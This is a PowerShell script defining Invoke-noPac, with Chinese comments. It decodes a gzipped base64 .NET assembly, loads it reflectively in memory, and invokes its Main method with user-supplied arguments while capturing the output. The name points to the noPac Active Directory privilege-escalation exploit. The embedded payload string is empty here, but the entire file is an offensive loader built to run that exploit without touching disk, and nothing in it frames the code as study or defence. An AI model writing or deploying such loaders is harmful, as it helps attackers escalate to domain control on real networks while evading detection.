function Invoke-noPac {
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "
    )
    
    $base64String = ""
    
    try {
        # 解压和加载程序集
        $compressedStream = New-Object IO.MemoryStream(,[Convert]::FromBase64String($base64String))
        $decompressed = New-Object IO.Compression.GzipStream($compressedStream, [IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream
        $decompressed.CopyTo($outputStream)
        [byte[]] $byteOutArray = $outputStream.ToArray()
        $loadedAssembly = [System.Reflection.Assembly]::Load($byteOutArray)
        
        # 方法1：尝试使用入口点
        if ($loadedAssembly.EntryPoint -ne $null) {
            Write-Host "使用入口点方法" -ForegroundColor Green
            $oldConsoleOut = [Console]::Out
            $stringWriter = New-Object IO.StringWriter
            [Console]::SetOut($stringWriter)
            
            $loadedAssembly.EntryPoint.Invoke($null, @(,$Command.Split(" ")))
            
            [Console]::SetOut($oldConsoleOut)
            return $stringWriter.ToString()
        }
        
        # 方法2：查找包含Main方法的类型
        $mainType = $loadedAssembly.GetTypes() | Where-Object {
            $_.GetMethod("Main", [System.Reflection.BindingFlags]'Static,Public') -ne $null
        } | Select-Object -First 1
        
        if ($mainType) {
            Write-Host "使用Main方法在: $($mainType.FullName)" -ForegroundColor Green
            $oldConsoleOut = [Console]::Out
            $stringWriter = New-Object IO.StringWriter
            [Console]::SetOut($stringWriter)
            
            $mainMethod = $mainType.GetMethod("Main", [System.Reflection.BindingFlags]'Static,Public')
            $mainMethod.Invoke($null, @(,$Command.Split(" ")))
            
            [Console]::SetOut($oldConsoleOut)
            return $stringWriter.ToString()
        }
        
        # 方法3：尝试常见类型名称
        $commonTypes = @("noPac.Program", "Program", "NoPac.Program", "MainClass")
        foreach ($typeName in $commonTypes) {
            $type = $loadedAssembly.GetType($typeName, $false, $true)
            if ($type -ne $null) {
                Write-Host "使用类型: $typeName" -ForegroundColor Green
                $oldConsoleOut = [Console]::Out
                $stringWriter = New-Object IO.StringWriter
                [Console]::SetOut($stringWriter)
                
                $type::Main($Command.Split(" "))
                
                [Console]::SetOut($oldConsoleOut)
                return $stringWriter.ToString()
            }
        }
        
        Write-Error "无法找到合适的入口点"
        return $null
    }
    catch {
        Write-Error "执行noPac时出错: $_"
        return $null
    }
}